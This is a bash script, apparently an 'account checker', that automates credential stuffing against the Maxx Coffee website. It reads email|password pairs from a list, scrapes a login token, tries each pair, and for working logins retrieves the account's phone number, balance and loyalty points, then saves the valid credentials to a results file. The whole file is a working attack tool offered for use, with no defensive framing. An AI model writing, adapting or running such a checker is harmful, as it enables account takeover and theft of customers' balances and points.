#!/bin/bash
# MAXXCOFFEE CHECKER
# Schopath Asshole
# Released: 10 Dec 2017
# Usage: maxxcoffee.sh userlist.txt

USRLIST=$1;
echo '!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~!';
echo '! MAXX COFFEE ACCOUNT CHECKER !';
echo '!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~!';
echo '';

for usrpass in $(cat $USRLIST); do

EMAIL=$(echo $usrpass | sed 's/|/ /g' | awk '{print $1}');
PASS=$(echo $usrpass | sed 's/|/ /g' | awk '{print $2}');
TOKEN=$(curl -sS https://maxx.coffee/login | grep 'token' | head -1 | sed 's/<input type="hidden" name="_token" value="/token /g' | sed 's/">//g' | awk '{print $2}');
curl -s --cookie-jar cookie.tmp --data "_token="$TOKEN --data "email="$EMAIL --data "password="$PASS https://maxx.coffee/login > maxx.tmp

if [[ $(cat maxx.tmp | grep 'The user credentials were incorrect.' | wc -l) == '1' ]]; then
	echo '[FALSE] '$EMAIL'|'$PASS' (BAD)';

elif [[ $(cat maxx.tmp | grep 'The credentials you entered' | wc -l) == '1' ]]; then
	echo '[FALSE] '$EMAIL'|'$PASS;

elif [[ $(cat maxx.tmp | grep 'Redirecting to https://maxx.coffee/home' | wc -l) == '1' ]]; then
	curl -s -L -b cookie.tmp https://maxx.coffee/home > maxx_gather.tmp
	PHONE=$(cat maxx_gather.tmp | grep 'var mobile_phonenya' | head -1 | sed 's/var mobile_phonenya = "//g' | sed 's/";//g' | awk '{print $1}')
	curl -s -L -b cookie.tmp --data "mobile_phone="$PHONE https://maxx.coffee/cekverifikasiajax > maxx_finalchk.tmp
	STAT=$(cat maxx_finalchk.tmp | sed 's/{"status":"//g' | sed 's/","bean":0,"balance":0}//g');
	BAL=$(cat maxx_finalchk.tmp | sed 's/{"status":"access granted","bean":0,"balance"://g' | sed 's/}//g');
	BEAN=$(cat maxx_finalchk.tmp | sed 's/{"status":"access granted","bean"://g' | sed 's/,"balance":0}//g');
	echo '[TRUE] '$EMAIL'|'$PASS' (BAL: '$BAL') (BEAN: '$BEAN')';
	echo $EMAIL'|'$PASS' (BAL: '$BAL') (BEAN: '$BEAN')' >> maxx_results.txt;

else
	echo '[FALSE] '$EMAIL'|'$PASS' (UNKNOWN)';
fi
rm -f cookie.tmp
rm -f maxx_gather.tmp
rm -f maxx.tmp
rm -f maxx_finalchk.tmp

done